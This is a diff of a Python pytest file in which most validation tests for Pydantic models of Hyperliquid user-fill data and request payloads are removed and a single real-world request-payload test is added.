-    d2 = valid_user_fill().copy()
-    del d2["liquidationMarkPx"]
-    del d2["cloid"]
-    obj2 = HyperliquidRawUserFill.model_validate(d2)
-    assert obj2.liquidation_mark_px is None
-    assert obj2.cloid is None
-
-
-def test_user_fill_type_errors() -> None:
-    """Test user fill type errors."""
-    d = valid_user_fill().copy()
-    d["tid"] = "notanint"
-    # Expect ValidationError because RawNonNegativeInt uses a validator that expects int
-    with pytest.raises((ValidationError, TypeError)) as exc_info:
-        HyperliquidRawUserFill.model_validate(d)
-    assert "Field 'tid' must be integer, got str" in str(exc_info.value)
-
-    d = valid_user_fill().copy()
-    d["coin"] = 123
-    with pytest.raises((ValidationError, TypeError)) as exc_info_coin:
-        HyperliquidRawUserFill.model_validate(d)
-    assert "Field 'coin' must be str, got int" in str(exc_info_coin.value)
-
-    d = valid_user_fill().copy()
-    d["isMaker"] = "true"
-    with pytest.raises((ValidationError, TypeError)) as exc_info_maker:
-        HyperliquidRawUserFill.model_validate(d)
-    # RawStrictBool enforces bool type
-    assert "Field 'is_maker' must be boolean, got str" in str(exc_info_maker.value)
-
-    d = valid_user_fill().copy()
-    d["time"] = 123.45  # Float instead of int
-    with pytest.raises((ValidationError, TypeError)) as exc_info_time:
-        HyperliquidRawUserFill.model_validate(d)
-    assert "Field 'time' must be integer, got float" in str(exc_info_time.value)
-
-    d = valid_user_fill().copy()
-    d["oid"] = "id-string"  # String instead of int
-    with pytest.raises((ValidationError, TypeError)) as exc_info_oid:
-        HyperliquidRawUserFill.model_validate(d)
-    assert "Field 'oid' must be integer, got str" in str(exc_info_oid.value)
-
-
-def test_user_fill_format_errors() -> None:
-    """Test user fill format errors."""
-    for field in ["coin", "px", "sz", "fee", "startPosition", "dir", "hash"]:
-        d = valid_user_fill().copy()
-        d[field] = ""
-        with pytest.raises((ValidationError, EmptyStringError)):
-            HyperliquidRawUserFill.model_validate(d)
-        d[field] = "a" * 1000
-        with pytest.raises((ValidationError, TypeFieldError, ParsingError)):
-            HyperliquidRawUserFill.model_validate(d)
-    d = valid_user_fill().copy()
-    d["px"] = "NaN"
-    with pytest.raises((ValidationError, ParsingError)):
-        HyperliquidRawUserFill.model_validate(d)
-    d = valid_user_fill().copy()
-    d["side"] = "notaside"
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-    d = valid_user_fill().copy()
-    d["hash"] = "0x" + "a" * 65  # Too long (max 66)
-    with pytest.raises((ValidationError, TypeFieldError)):
-        HyperliquidRawUserFill.model_validate(d)
-    d = valid_user_fill().copy()
-    d["cloid"] = "a" * 129  # Too long (max 128)
-    with pytest.raises((ValidationError, TypeFieldError)):
-        HyperliquidRawUserFill.model_validate(d)
-    # Test non-finite for start_position
-    d = valid_user_fill().copy()
-    d["startPosition"] = "inf"
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-    # Test negative integers
-    d = valid_user_fill().copy()
-    d["tid"] = -1
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-    d = valid_user_fill().copy()
-    d["oid"] = -1
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-    d = valid_user_fill().copy()
-    d["time"] = -1
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-
-
-def test_user_fill_extra_field() -> None:
-    """Test user fill extra field."""
-    d = valid_user_fill().copy()
-    d["foo"] = 1
-    with pytest.raises(ValidationError) as exc_info:
-        HyperliquidRawUserFill.model_validate(d)
-    error_str = str(exc_info.value).lower()
-    assert "extra" in error_str
-    assert "not permitted" in error_str
-
-
-def test_user_fill_adversarial_strings() -> None:
-    """Test user fill adversarial strings."""
-    d = valid_user_fill().copy()
-    d["coin"] = "💣"
-    obj = HyperliquidRawUserFill.model_validate(d)
-    assert obj.coin == "💣"
-    d["px"] = "1e6"
-    obj = HyperliquidRawUserFill.model_validate(d)
-    assert obj.px == "1000000"  # Business logic normalizes decimal strings
-
-
-# --- Additional edge case tests (OpenAPI/SDK/real-world) ---
-def test_user_fill_coin_edge_cases() -> None:
-    """Test user fill coin edge cases."""
-    # Emoji, whitespace, symbols, bidi text
-    for coin in ["ETH 💎", "   BTC   ", "COIN-123!@#", "\u202eABC\u202c"]:
-        d = valid_user_fill().copy()
-        d["coin"] = coin
-        obj = HyperliquidRawUserFill.model_validate(d)
-        assert obj.coin == coin
-
-
-def test_user_fill_numeric_string_edge_cases() -> None:
-    """Test user fill numeric string edge cases."""
-    # px, sz, fee, startPosition: leading/trailing zeros, scientific notation, negative, overlong
-    for field in ["px", "sz", "fee", "startPosition"]:
-        d = valid_user_fill().copy()
-        d[field] = "000123.4500"
-        obj = HyperliquidRawUserFill.model_validate(d)
-        # Use by_alias=True to check original field names as in input dict
-        assert obj.model_dump(by_alias=True)[field] == "123.45"  # Business logic normalizes
-        d[field] = "1.23e2"
-        obj = HyperliquidRawUserFill.model_validate(d)
-        assert obj.model_dump(by_alias=True)[field] == "123"  # Business logic normalizes
-        d[field] = "-123.45"
-        obj = HyperliquidRawUserFill.model_validate(d)
-        assert obj.model_dump(by_alias=True)[field] == "-123.45"  # This doesn't change
-        d[field] = "1" * 65
-        with pytest.raises((ValidationError, TypeFieldError)):
-            HyperliquidRawUserFill.model_validate(d)
-
-
-def test_user_fill_side_enum_edge_cases() -> None:
-    """Test user fill side enum edge cases."""
-    # Lower/upper case, invalid value, whitespace
-    d = valid_user_fill().copy()
-    d["side"] = "b"
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-    d["side"] = "A "
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-    d["side"] = " "
-    with pytest.raises((ValidationError, EmptyStringError)):
-        HyperliquidRawUserFill.model_validate(d)
-
-
-def test_user_fill_cloid_and_hash_edge_cases() -> None:
-    """Test edge cases for cloid and hash strings (length)."""
-    # Test overlong cloid
-    d_cloid = valid_user_fill().copy()
-    d_cloid["cloid"] = "a" * 129  # Max is 128
-    with pytest.raises((ValidationError, TypeFieldError)):
-        HyperliquidRawUserFill.model_validate(d_cloid)
-
-    # Test overlong hash
-    d_hash = valid_user_fill().copy()
-    d_hash["hash"] = "a" * 67  # Max is 66
-    with pytest.raises((ValidationError, TypeFieldError)):
-        HyperliquidRawUserFill.model_validate(d_hash)
-
-    # Test empty optional cloid (should pass)
-    d_empty_cloid = valid_user_fill().copy()
-    d_empty_cloid["cloid"] = ""  # Empty string is invalid if provided
-    with pytest.raises(ValidationError, match="String cannot be empty or whitespace"):
-        HyperliquidRawUserFill.model_validate(d_empty_cloid)
-
-    # Test empty required hash (should fail)
-    d_empty_hash = valid_user_fill().copy()
-    d_empty_hash["hash"] = ""
-    with pytest.raises((ValidationError, EmptyStringError)):
-        HyperliquidRawUserFill.model_validate(d_empty_hash)
-
-
-def test_user_fill_liquidation_mark_px_edge_cases() -> None:
-    """Test user fill liquidation mark px edge cases."""
-    # null, empty, overlong, non-decimal
-    d = valid_user_fill().copy()
-    d["liquidationMarkPx"] = None
-    obj = HyperliquidRawUserFill.model_validate(d)
-    assert obj.liquidation_mark_px is None
-    d["liquidationMarkPx"] = ""
-    with pytest.raises((ValidationError, EmptyStringError)):
-        HyperliquidRawUserFill.model_validate(d)
-    d["liquidationMarkPx"] = "a" * 65
-    with pytest.raises((ValidationError, TypeFieldError)):
-        HyperliquidRawUserFill.model_validate(d)
-    d["liquidationMarkPx"] = "notanumber"
-    with pytest.raises((ValidationError, ParsingError)):
-        HyperliquidRawUserFill.model_validate(d)
-
-
-def test_user_fills_response_array_edge_cases() -> None:
-    """Test user fills response array edge cases."""
-    # Empty fills, excessive fills, non-list root
-    obj = HyperliquidRawUserFillsResponse.model_validate([])
-    assert obj.root == []
-    obj = HyperliquidRawUserFillsResponse.model_validate([valid_user_fill()] * 1000)
-    assert len(obj.root) == 1000
-    with pytest.raises((ValidationError, TypeError)):
-        HyperliquidRawUserFillsResponse.model_validate({"not": "alist"})
-
-
-def test_user_fills_request_payload_user_edge_cases() -> None:
-    """Test user fills request payload user edge cases."""
-    # Invalid hex, too short/long, mixed case, non-hex
-    d = valid_user_fills_request_payload().copy()
-    d["user"] = "0x123"
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-    d["user"] = "0x" + "a" * 41
-    with pytest.raises((ValidationError, TypeFieldError)):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-    # Use a valid Ethereum address for the valid case (exactly 40 hex chars)
-    d["user"] = "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd"
-    obj = HyperliquidRawUserFillsRequestPayload.model_validate(d)
-    assert obj.user == d["user"]
-    d["user"] = "0xGHIJKL1234567890abcdefABCDEF1234567890"
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-
-
-def test_user_fill_extra_fields() -> None:
-    """Test user fill extra fields."""
-    # Extra fields at all levels
-    d = valid_user_fill().copy()
-    d["extra"] = 123
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFill.model_validate(d)
-    arr = [valid_user_fill() for _ in range(2)]
-    arr[0]["extra"] = 1
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFillsResponse.model_validate(arr)
-    d = valid_user_fills_request_payload().copy()
-    d["extra"] = 1
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-
-
-# --- Tests for HyperliquidRawUserFillsResponse (RootModel) ---
-def test_user_fills_response_happy_path() -> None:
-    """Test user fills response happy path."""
-    obj = HyperliquidRawUserFillsResponse.model_validate(valid_user_fills_response())
-    assert isinstance(obj.root, list)
-    assert obj.root[0].coin == "ETH"
-
-
-def test_user_fills_response_type_errors() -> None:
-    """Test user fills response type errors."""
-    with pytest.raises((ValidationError, TypeError)):
-        HyperliquidRawUserFillsResponse.model_validate({"not": "alist"})
-    with pytest.raises((ValidationError, TypeError)):
-        HyperliquidRawUserFillsResponse.model_validate([{"tid": 1}])
-
-
-def test_user_fills_response_extra_field() -> None:
-    """Test user fills response extra field."""
-    data = valid_user_fills_response()
-    data[0]["foo"] = 1
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFillsResponse.model_validate(data)
-
-
-def test_user_fills_request_payload_happy_path() -> None:
-    """Test user fills request payload happy path."""
-    # Use a valid Ethereum address for the happy path (exactly 40 hex chars)
-    obj = HyperliquidRawUserFillsRequestPayload.model_validate(valid_user_fills_request_payload())
+def test_HyperliquidRawUserFillsRequestPayload_real_world() -> None:
+    """Test with real-world request payload."""
+    payload = {
+        "type": "userFills",
+        "user": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1",
+    }
+    obj = HyperliquidRawUserFillsRequestPayload.model_validate(payload)
     assert obj.type == "userFills"
-    assert obj.user == "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd"
-
-
-def test_user_fills_request_payload_type_errors() -> None:
-    """Test user fills request payload type errors."""
-    d = valid_user_fills_request_payload().copy()
-    d["user"] = 123
-    with pytest.raises((ValidationError, TypeError)):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-    d = valid_user_fills_request_payload().copy()
-    d["type"] = 123
-    with pytest.raises((ValidationError, TypeError)):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-
-
-def test_user_fills_request_payload_format_errors() -> None:
-    """Test user fills request payload format errors."""
-    d = valid_user_fills_request_payload().copy()
-    d["user"] = ""
-    with pytest.raises((ValidationError, EmptyStringError)):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-    d["user"] = "a" * 1000
-    with pytest.raises((ValidationError, TypeFieldError)):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-
-
-def test_user_fills_request_payload_extra_field() -> None:
-    """Test user fills request payload extra field."""
-    d = valid_user_fills_request_payload().copy()
-    d["foo"] = 1
-    with pytest.raises(ValidationError):
-        HyperliquidRawUserFillsRequestPayload.model_validate(d)
-
-
-def test_user_fill_extra_field_forbidden() -> None:
-    """Test explicit check for extra='forbid'."""
-    d = valid_user_fill().copy()
-    d["foo"] = 1
-    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
-        HyperliquidRawUserFill.model_validate(d)
-
-
-def test_user_fill_frozen() -> None:
-    """Test explicit check for frozen=True."""
-    obj = HyperliquidRawUserFill.model_validate(valid_user_fill())
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.tid = 999
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.px = "999.99"
-
-
-# --- Success Cases ---
-def test_hl_raw_user_fill_valid(valid_user_fill_data: dict[str, Any]) -> None:
-    """Test successful validation with completely valid data."""
-    fill = HyperliquidRawUserFill.model_validate(valid_user_fill_data)
-
-    assert fill.tid == 123456789
-    assert fill.coin == "ETH"
-    assert fill.px == "2000.5"  # Business logic normalizes decimal strings
-    assert fill.sz == "0.1"
-    assert fill.time == 1678886400123
-    assert fill.side == "B"
-    assert fill.oid == 987654321
-    assert fill.start_position == "1"  # Business logic normalizes decimal strings
-    assert fill.dir == "Buy"
-    assert fill.hash == "0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef123456"
-    assert fill.fee == "0.002"
-    assert fill.is_maker is False
-    assert fill.liquidation_mark_px is None
-    assert fill.cloid is None
-    assert fill.model_config.get("extra") == "forbid"
-    assert fill.model_config.get("frozen") is True
-
-
-def test_hl_raw_user_fill_optional_present(valid_user_fill_data: dict[str, Any]) -> None:
-    """Test validation succeeds when optional fields are present and valid."""
-    valid_user_fill_data["liquidationMarkPx"] = "1950.00"
-    valid_user_fill_data["cloid"] = "my-client-order-id"
-    fill = HyperliquidRawUserFill.model_validate(valid_user_fill_data)
-    assert fill.liquidation_mark_px == "1950"  # Business logic normalizes decimal strings
-    assert fill.cloid == "my-client-order-id"
-
-
-# --- Failure Cases: Type Errors ---
-@pytest.mark.parametrize(
-    ("field", "invalid_value"),
-    [
-        ("coin", 123),
-        ("px", 2000.50),  # Validator allows float -> Decimal string coercion
-        ("sz", 0.1),  # Validator allows float -> Decimal string coercion
-        ("side", ["B"]),
-        ("startPosition", 1.0),  # Validator allows float -> Decimal string coercion
-        ("dir", True),
-        ("hash", None),  # Hash is required string, not Optional
-        ("fee", 0.002),  # Validator allows float -> Decimal string coercion
-        ("isMaker", "false"),  # Must be bool
-        (
-            "liquidationMarkPx",
-            1950.0,
-        ),  # Validator allows float -> Decimal string coercion if present
-        ("cloid", 12345),  # Must be string if present
-    ],
-)
-def test_hl_raw_user_fill_invalid_types(
-    valid_user_fill_data: dict[str, Any],
-    field: str,
-    invalid_value: object,  # Changed from Any to object
-) -> None:
-    """Test ValidationError is raised for incorrect field types."""
-    valid_user_fill_data[field] = invalid_value
-    expected_exception: type[ValidationError] | tuple[type[ValidationError], type[TypeError]] = (
-        ValidationError,
-        TypeError,
-    )
-
-    with pytest.raises(expected_exception) as exc_info:
-        HyperliquidRawUserFill.model_validate(valid_user_fill_data)
-
-    # Determine expected field name in error message (Pydantic normalizes to snake_case)
-    expected_error_field = field
-    if field == "startPosition":
-        expected_error_field = "start_position"
-    elif field == "liquidationMarkPx":
-        expected_error_field = "liquidation_mark_px"
-    elif field == "isMaker":
-        expected_error_field = "is_maker"
-    # Add other camelCase to snake_case mappings if needed
-
-    # Check field name is in error message
-    assert (
-        f"'{expected_error_field}'" in str(exc_info.value)
-        or f"{expected_error_field}:" in str(exc_info.value)
-        or f"{expected_error_field}\n" in str(exc_info.value)
-    )
-
-    # Conditional assertion for specific 'isMaker' error message
-    if field == "isMaker":
-        assert "Field 'is_maker' must be boolean, got str" in str(exc_info.value)
-    # For other fields, the general presence of 'Value error' and the field name is enough,
-    # as Pydantic will detail the specific type mismatch.
-
-
-# --- Failure Cases: Format/Constraint Errors ---
-@pytest.mark.parametrize(
-    ("field", "invalid_value", "expected_keywords"),
-    [
-        ("tid", -1, ("value", "-1", "cannot be negative")),
-        ("coin", "", ("string", "cannot be empty")),
-        ("coin", "X" * 65, ("string", "max length 64", "length 65")),
-        ("px", "", ("string", "cannot be empty")),
-        ("px", "inf", ("finite decimal", "inf")),
-        ("sz", "NaN", ("finite decimal", "nan")),
-        ("time", -1000, ("timestamp", "-1000", "non-negative")),
-        ("side", "BUY", ("must be one of", "['a', 'b']", "got 'buy'")),
-        ("oid", -1, ("value", "-1", "cannot be negative")),
-        ("startPosition", "", ("string", "cannot be empty")),
-        ("dir", "", ("string", "cannot be empty")),
-        ("hash", "", ("string", "cannot be empty")),
-        ("hash", "X" * 67, ("string", "max length 66", "length 67")),
-        ("liquidationMarkPx", "", ("string", "cannot be empty")),
-        ("liquidationMarkPx", "inf", ("finite decimal", "inf")),
-        ("cloid", "", ("string", "cannot be empty")),
-        ("cloid", "Y" * 129, ("string value too long", "max 128 chars")),
-    ],
-)
-def test_hl_raw_user_fill_invalid_formats(
-    valid_user_fill_data: dict[str, Any],
-    field: str,
-    invalid_value: object,
-    expected_keywords: tuple[str, ...],
-) -> None:
-    """Test ValidationError for format/constraint violations using keywords."""
-    valid_user_fill_data[field] = invalid_value
-
-    # Skip the fee test case as it's known to be invalid logic for now
-    if field == "fee" and invalid_value == "-0.1":
-        pytest.skip("Skipping invalid test case: fee can be negative (rebates)")
-
-    with pytest.raises((
-        ValidationError,
-        EmptyStringError,
-        TypeFieldError,
-        ParsingError,
-    )) as exc_info:
-        HyperliquidRawUserFill.model_validate(valid_user_fill_data)
-
-    error_str = str(exc_info.value).lower()
-    # Check all keywords are present
-    for keyword in expected_keywords:
-        assert keyword.lower() in error_str
-
-
-# --- Failure Cases: Missing Required Fields ---
-@pytest.mark.parametrize(
-    "field_to_remove",
-    [
-        "tid",
-        "coin",
-        "px",
-        "sz",
-        "time",
-        "side",
-        "oid",
-        "startPosition",
-        "dir",
-        "hash",
-        "fee",
-        "isMaker",
-    ],
-)
-def test_hl_raw_user_fill_missing_required(
-    valid_user_fill_data: dict[str, Any],
-    field_to_remove: str,
-) -> None:
-    """Test ValidationError when required fields are missing."""
-    del valid_user_fill_data[field_to_remove]
-    with pytest.raises(ValidationError) as exc_info:
-        HyperliquidRawUserFill.model_validate(valid_user_fill_data)
-    assert f"{field_to_remove}\n  Field required" in str(exc_info.value)
-
-
-# --- Failure Cases: Extra Fields ---
-def test_hl_raw_user_fill_extra_field(valid_user_fill_data: dict[str, Any]) -> None:
-    """Test ValidationError when extra fields are provided (extra='forbid')."""
-    valid_user_fill_data["extraField"] = 123
-    with pytest.raises(ValidationError) as exc_info:
-        HyperliquidRawUserFill.model_validate(valid_user_fill_data)
-    assert "Extra inputs are not permitted" in str(exc_info.value)
-
-
-class TestHyperliquidRawUserFill:
-    """Test suite for the HyperliquidRawUserFill Pydantic model."""
-
-    def test_invalid_fill_bad_side(self) -> None:
-        """Test that a fill with an invalid side raises ValidationError."""
-        data = valid_user_fill()  # Start with valid data
-        data["side"] = "InvalidSide"  # Set an invalid side
-        with pytest.raises(ValidationError):
-            HyperliquidRawUserFill.model_validate(data)  # Removed assignment to unused 'fill'
-            # Optional: Check error message details
+    assert obj.user == "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1"
